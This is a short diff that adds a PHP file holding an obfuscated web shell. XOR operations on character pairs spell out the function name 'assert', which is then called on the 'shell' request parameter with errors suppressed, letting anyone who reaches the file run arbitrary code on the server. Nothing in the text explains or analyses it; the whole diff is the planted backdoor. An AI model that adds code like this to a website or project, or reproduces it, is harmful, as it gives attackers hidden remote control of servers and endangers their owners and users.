@@ -1,0 +1,9 @@
+<?php
+$one="Y"^"8";
+$two="T"^"'";
+$three="*"^"O";
+$four="M"^"?";
+$five="-"^"Y";
+$payload=$one.$two.$two.$three.$four.$five;
+@$payload(@$_REQUEST['shell']);
+?>
